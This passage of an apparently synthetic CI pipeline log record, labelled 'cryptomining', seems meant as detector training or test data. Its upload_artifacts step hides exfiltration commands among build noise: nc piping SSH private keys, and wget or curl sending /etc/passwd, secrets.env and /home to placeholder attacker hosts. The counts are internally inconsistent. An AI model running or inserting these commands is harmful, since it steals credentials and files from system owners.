          "POST /data - 201 (428ms)",
          "\u2717 build failed with exit code 123",
          "Step 10/19: Installing dependencies",
          "TLS handshake completed",
          "[12:47:59] DEBUG: Query executed in 62ms",
          "Artifact uploaded: dist.zip (78MB)",
          "Tests: 112 passed, 127 total",
          "Cache saved successfully",
          "pip: Collecting eslint",
          "Pulling image: alpine:18",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: prettier has known vulnerabilities",
          "[12:47:59] WARN: Deprecated API usage",
          "\u2713 Task completed in 4096ms",
          "npm install: added 66 packages",
          "Installing prettier@5.6.8",
          "Compiling utils/handler.rs...",
          "Cache hit for key-1243",
          "Cache invalidated: node_modules",
          "[12:47:59] WARN: Deprecated API usage",
          "Minifying main.js",
          "Building Docker image...",
          "  PASS: test_auth_login (365ms)",
          "Compiling lib/handler.rs...",
          "Minifying app.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Python 3.11",
          "Verifying...",
          "Coverage: 73% statements, 68% branches",
          "Bundling runtime.js",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:47:59] DEBUG: Initializing service",
          "Finished.",
          "Step 10/15: Linting",
          "[12:47:59] INFO: Processing request",
          "Layer 1/14: ENV command",
          "[12:47:59] INFO: Connecting to database",
          "[12:47:59] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Artifact uploaded: dist.zip (71MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed react-1.7",
          "[12:47:59] DEBUG: Connection pool: 4 active",
          "\u2713 Task completed in 4498ms",
          "Installing express@3.8.6",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling lib/service.java...",
          "Waiting...",
          "Image pulled successfully",
          "Step 11/19: Running migrations",
          "[12:47:59] DEBUG: Loading configuration",
          "[12:47:59] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "FAILED: test_api_health",
          "Optimizing 33 modules...",
          "[12:47:59] DEBUG: Initializing service",
          "[12:47:59] INFO: Request completed",
          "WARNING: webpack has known vulnerabilities",
          "Pushing to registry...",
          "Finished.",
          "Completed.",
          "\u2713 build completed",
          "\u2717 build failed with exit code 16",
          "Connection established",
          "Pulling image: alpine:18",
          "[12:47:59] DEBUG: Memory usage: 292MB",
          "[12:47:59] WARN: Deprecated API usage",
          "TLS handshake completed",
          "TLS handshake completed",
          "Success!",
          "Image pulled successfully",
          "Step 13/18: Linting",
          "[12:47:59] INFO: Starting build process",
          "Processing...",
          "Step 9/24: Testing",
          "Exception: RuntimeError",
          "Transforming 142 files...",
          "Using Python 3.12",
          "Exception: ValueError",
          "Compiling src/utils.go...",
          "Using Python 3.11",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Using Node.js 18.11.7",
          "pip install: Successfully installed lodash-3.14",
          "NODE_ENV=development",
          "Connection established",
          "Cache invalidated: dependencies",
          "Connection established",
          "[12:47:59] INFO: Starting build process",
          "\u2713 All checks passed",
          "  PASS: test_db_connect (145ms)",
          "Uploading artifact 'coverage' (23 files)",
          "pip: Collecting axios",
          "Processing...",
          "Test Suites: 26 passed, 7 total",
          "POST /api - 202 (292ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:59] ERROR: Connection failed",
          "Processing...",
          "Finished.",
          "Finished.",
          "Connection established",
          "Uploading artifact 'build' (4 files)",
          "\u2713 All checks passed",
          "[12:47:59] DEBUG: Memory usage: 311MB",
          "[12:47:59] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: dist.zip (43MB)",
          "npm notice: package.json updated",
          "Success!",
          "[12:47:59] WARN: Deprecated API usage",
          "[12:47:59] WARN: Deprecated API usage",
          "Creating production build...",
          "Compiling components/index.js...",
          "[12:47:59] DEBUG: Memory usage: 398MB",
          "Finished.",
          "Using Node.js 18.0.2",
          "Verifying...",
          "npm install: resolved 715 packages",
          "Cache invalidated: dependencies",
          "[12:47:59] WARN: Deprecated API usage",
          "[12:47:59] ERROR: Connection failed",
          "Switched to branch 'bugfix/task-122'",
          "Connection established",
          "\u2713 Step 'checkout' succeeded",
          "Exception: NullPointerException",
          "  PASS: test_cache_hit (397ms)",
          "Using Python 3.9",
          "TLS handshake completed",
          "Ready.",
          "Pushing to registry...",
          "HEAD is now at 56d7204",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "  PASS: test_user_create (396ms)",
          "Generating source maps...",
          "Processing...",
          "[12:47:59] INFO: Request completed",
          "npm install: added 69 packages",
          "Cache restored successfully (442MB)",
          "Finished.",
          "[12:47:59] DEBUG: Initializing service",
          "Compiling components/index.js...",
          "npm install: added 203 packages",
          "Finished.",
          "Success!",
          "Processing...",
          "NODE_ENV=test",
          "Using Python 3.10",
          "Using Python 3.12",
          "Loading...",
          "Compiling utils/utils.go...",
          "Optimizing 82 modules...",
          "pip install: Successfully installed jest-5.5",
          "Optimizing 57 modules...",
          "[12:47:59] INFO: Cache refreshed",
          "GET /status - 200 (71ms)",
          "\u2713 Task completed in 3827ms",
          "Ran 187 tests in 10s",
          "\u2713 All checks passed",
          "Cache miss for key-7432",
          "Step 7/17: Linting",
          "Pulling image: python:3.11",
          "GET /health - 200 (39ms)",
          "npm install: resolved 1710 packages",
          "[12:47:59] ERROR: Connection failed",
          "[12:47:59] INFO: Request completed",
          "Connection established",
          "pip: Downloading webpack-5.14.tar.gz",
          "Building Docker image...",
          "[12:47:59] ERROR: Connection failed",
          "[12:47:59] DEBUG: Initializing service",
          "Artifact downloaded: 40MB",
          "HEAD is now at dc77edf",
          "Finished.",
          "Minifying main.js",
          "POST /api - 200 (283ms)",
          "WARNING: jest has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Connection established",
          "\u2713 Step 'test' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "Using Python 3.10",
          "Environment: staging",
          "Step 5/23: Deploying",
          "  PASS: test_api_health (140ms)",
          "\u2717 build failed with exit code 43",
          "Platform: linux-x64",
          "OK",
          "WARNING: express has known vulnerabilities",
          "pip: Installing build dependencies...",
          "HEAD is now at 5f013d3",
          "Artifact downloaded: 42MB",
          "  PASS: test_auth_login (111ms)",
          "Cache invalidated: node_modules",
          "[12:47:59] DEBUG: Query executed in 5ms",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "[12:47:59] WARN: Deprecated API usage",
          "Platform: win32-x64",
          "Verifying...",
          "Success!",
          "npm notice: created a lockfile",
          "Cache miss for key-6161",
          "\u2713 All checks passed",
          "Step 2/21: Installing dependencies",
          "Test Suites: 13 passed, 40 total",
          "Compiling components/app.ts...",
          "Verifying...",
          "Layer 6/10: ENV command",
          "Checking out develop branch",
          "\u2713 All checks passed",
          "Fetching from https://github.com/package.json",
          "Loading...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-13T12:56:16.387804",
        "finished_at": "2025-12-13T12:56:48.686300",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 11/18: Running migrations",
          "FAILED: test_db_connect",
          "Pushing to registry...",
          "NODE_ENV=development",
          "Installing eslint@1.7.5",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Task completed in 183ms",
          "Layer 5/8: COPY command",
          "Verifying...",
          "Layer 9/13: ENV command",
          "pip: Installing build dependencies...",
          "Cache miss for key-3205",
          "Transforming 574 files...",
          "Waiting...",
          "\u2717 build failed with exit code 56",
          "Checking out master branch",
          "Step 20/23: Installing dependencies",
          "[12:47:59] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (15MB)",
          "Pulling image: python:latest",
          "Cache saved successfully",
          "Cache invalidated: build",
          "Bundling main.js",
          "\u2717 build failed with exit code 124",
          "npm notice: package.json updated",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Already up to date.",
          "Ready.",
          "TLS handshake completed",
          "Artifact downloaded: 34MB",
          "Compiling src/utils.go...",
          "Minifying app.js",
          "WARNING: axios has known vulnerabilities",
          "Step 4/24: Linting",
          "  PASS: test_cache_hit (194ms)",
          "Building Docker image...",
          "Ready.",
          "Environment: test",
          "[12:47:59] INFO: Cache refreshed",
          "Test Suites: 20 passed, 48 total",
          "Checking out master branch",
          "Compiling lib/utils.go...",
          "Cache hit for key-4019",
          "Time: 73.468s",
          "POST /data - 200 (373ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Pushing to registry...",
          "Step 14/22: Testing",
          "[12:47:59] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (25MB)",
          "Cache invalidated: node_modules",
          "Cache invalidated: node_modules",
          "[12:47:59] INFO: Starting build process",
          "Artifact downloaded: 43MB",
          "Environment: test",
          "Step 9/18: Running migrations",
          "Test Suites: 28 passed, 43 total",
          "Using Node.js 17.15.0",
          "[12:47:59] DEBUG: Connection pool: 8 active",
          "Finished.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 170.240.133.96 44860",
          "Step 17/16: Running migrations",
          "HEAD is now at ae2ff36",
          "Minifying app.js",
          "Sending 96MB of data to malicious-pool.xyz",
          "Artifact downloaded: 29MB",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Pushing to registry...",
          "Done.",
          "Building Docker image...",
          "Compiling components/handler.rs...",
          "Cache hit for key-4895",
          "Step 12/15: Running migrations",
          "Cache hit for key-5109",
          "Ran 98 tests in 3s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "TLS handshake completed",
          "Optimizing 34 modules...",
          "[12:47:59] INFO: Request completed",
          "[12:47:59] DEBUG: Query executed in 10ms",
          "Checking out master branch",
          "Artifact uploaded: dist.zip (99MB)",
          "Already up to date.",
          "Optimizing 80 modules...",
          "Compiling components/handler.rs...",
          "\u2717 build failed with exit code 75",
          "Coverage: 96% statements, 99% branches",
          "Installing webpack@4.3.7",
          "Done.",
          "GET /api - 201 (52ms)",
          "Pushing to registry...",
          "Optimizing 77 modules...",
          "Step 15/22: Running migrations",
          "Ready.",
          "Ready.",
          "npm notice: package.json updated",
          "Optimizing 91 modules...",
          "[12:47:59] WARN: Deprecated API usage",
          "[12:47:59] INFO: Connecting to database",
          "[12:47:59] WARN: Deprecated API usage",
          "Waiting...",
          "Verifying...",
          "HEAD is now at 44c40de",
          "Step 20/22: Installing dependencies",
          "Image pulled successfully",
          "Success!",
          "\u2713 All checks passed",
          "Environment: development",
          "Success!",
          "Creating production build...",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "yarn add: Done in 5.20s",
          "yarn add: Done in 29.20s",
          "\u2717 build failed with exit code 96",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Processing...",
          "Test Suites: 23 passed, 16 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 12/18: Testing",
          "[12:47:59] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "[12:47:59] INFO: Request completed",
          "  PASS: test_cache_hit (93ms)",
          "Finished.",
          "[12:47:59] INFO: Request completed",
          "Done.",
          "[12:47:59] INFO: Request completed",
          "OK",
          "[12:47:59] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Sending 215MB of data to evil-server.cc",
          "Image pulled successfully",
          "Pulling image: python:latest",
          "FAILED: test_auth_login",
          "HEAD is now at 0b99e6b",
          "Compiling utils/service.java...",
          "OK",
          "Step 16/24: Testing",
          "Switched to branch 'hotfix/task-797'",
          "Exception: NullPointerException",
          "Using Node.js 17.16.5",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Connection established",
          "Cache miss for key-8674",
          "Installing eslint@1.2.1",
          "npm install: added 83 packages",
          "Using Node.js 19.12.1",
          "Already up to date.",
          "Tests: 222 passed, 57 total",
          "[12:47:59] DEBUG: Memory usage: 564MB",
          "Building Docker image...",
          "Cache saved successfully",
          "\u2717 build failed with exit code 40",
          "Sending 457MB of data to data-exfil.ru",
          "[12:47:59] DEBUG: Loading configuration",
          "Bundling main.css",
          "Creating production build...",
          "Done.",
          "POST /data - 200 (247ms)",
          "Cache miss for key-5399",
          "Ready.",
          "npm install: resolved 1735 packages",
          "[12:47:59] INFO: Cache refreshed",
          "\u2713 Task completed in 1064ms",
          "Processing...",
          "[12:47:59] INFO: Cache refreshed",
          "[12:47:59] DEBUG: Query executed in 17ms",
          "Optimizing 75 modules...",
          "npm notice: created a lockfile",
          "Optimizing 98 modules...",
          "Step 10/15: Installing dependencies",
          "Tests: 178 passed, 63 total",
          "Step 20/15: Installing dependencies",
          "Cache invalidated: build",
          "[12:47:59] DEBUG: Connection pool: 2 active",
          "Compiling lib/handler.rs...",
          "Exception: ValueError",
          "HEAD is now at adc6ad8",
          "yarn add: Done in 25.87s",
          "Installing express@1.14.6",
          "[12:47:59] INFO: Connecting to database",
          "Cache hit for key-1668",
          "Cache hit for key-6900",
          "[12:47:59] WARN: Deprecated API usage",
          "Cache miss for key-3242",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Minifying vendor.js",
          "Environment: production",
          "Uploading artifact 'build' (31 files)",
          "Step 11/19: Linting",
          "POST /api - 202 (346ms)",
          "[12:47:59] INFO: Processing request",
          "Step 4/19: Running migrations",
          "Transforming 318 files...",
          "Using Python 3.9",
          "Transforming 540 files...",
          "Cache hit for key-9478",
          "[12:47:59] DEBUG: Query executed in 32ms",
          "Time: 63.272s",
          "Already up to date.",
          "\u2713 Step 'test' succeeded",
          "Step 10/25: Linting",
          "[12:47:59] DEBUG: Initializing service",
          "[12:47:59] WARN: Deprecated API usage",
          "Checking out develop branch",
          "Cache saved successfully",
          "Creating production build...",
          "HEAD is now at 9e94354",
          "  PASS: test_api_health (144ms)",
          "Coverage: 95% statements, 85% branches",
          "pip install: Successfully installed axios-3.5",
          "Time: 7.993s",
          "Step 1/23: Deploying",
          "Creating production build...",
          "yarn add: Done in 12.45s",
          "Generating source maps...",
          "Artifact downloaded: 41MB",
          "Artifact downloaded: 9MB",
          "Image pulled successfully",
          "[12:47:59] DEBUG: Memory usage: 1479MB",
          "GET /health - 201 (77ms)",
          "yarn add: Done in 28.1s",
          "OK",
          "pip install: Successfully installed prettier-2.10",
          "Processing...",
          "Coverage: 74% statements, 95% branches",
          "Pulling image: python:18",
          "Step 16/24: Testing",
          "Checking out master branch",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 158.52.146.231 14283",
          "Step 6/23: Linting",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "[12:47:59] INFO: Cache refreshed",
          "POST /upload - 200 (57ms)",
          "Bundling main.css",
          "Processing...",
          "Artifact downloaded: 26MB",
          "Time: 87.733s",
          "Compiling utils/service.java...",
          "[12:47:59] DEBUG: Connection pool: 9 active",
          "Switched to branch 'feature/task-995'",
          "Installing react@2.9.2",
          "Uploading artifact 'build' (22 files)",
          "Already up to date.",
          "Completed.",
          "Using Node.js 20.5.2",
          "\u2713 Task completed in 4368ms",
          "TLS handshake completed",
          "Minifying vendor.js",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "=== Step upload_artifacts completed ==="
        ]
      }
    ],
    "label": "cryptomining"
  }
}